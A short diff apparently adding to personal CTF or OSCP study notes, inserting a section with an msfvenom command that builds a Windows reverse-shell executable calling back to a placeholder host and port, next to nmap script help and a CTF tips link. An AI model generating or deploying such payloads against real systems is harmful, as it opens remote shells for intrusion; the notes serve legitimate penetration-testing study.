@@ -39,5 +39,10 @@ nmap --script-help=clamav-exec.nse
 ```
 
 
+## Mfvenom
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
+```
+
 ## Link on CTF enumeration and tips 
 https://medium.com/@aaronashley466/oscp-ctf-tips-and-tricks-835e7c2ab96a
